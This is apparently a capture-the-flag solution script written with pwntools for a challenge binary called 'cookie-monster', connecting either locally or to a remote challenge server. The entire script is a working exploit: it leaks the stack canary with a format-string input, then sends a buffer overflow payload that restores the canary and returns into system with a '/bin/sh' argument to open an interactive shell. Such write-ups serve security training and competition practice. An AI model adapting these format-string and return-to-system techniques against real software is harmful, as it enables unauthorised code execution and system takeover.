#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./cookie-monster')

if args.REMOTE:
	p = remote('chals.damctf.xyz', 31312)
else:
	p = process(binary.path)

p.sendlineafter(b': ',b'%15$p')
p.recvuntil(b'Hello ')
canary = int(p.recvline().strip(),16)
log.info('canary: ' + hex(canary))

payload  = b''
payload += (0x30 - 0x10) * b'A'
payload += p32(canary)
payload += (0x30 - len(payload)) * b'B'
payload += p32(binary.plt.system)
payload += p32(0)
payload += p32(binary.search(b"/bin/sh").__next__())

p.sendlineafter(b'?\n',payload)
p.interactive()

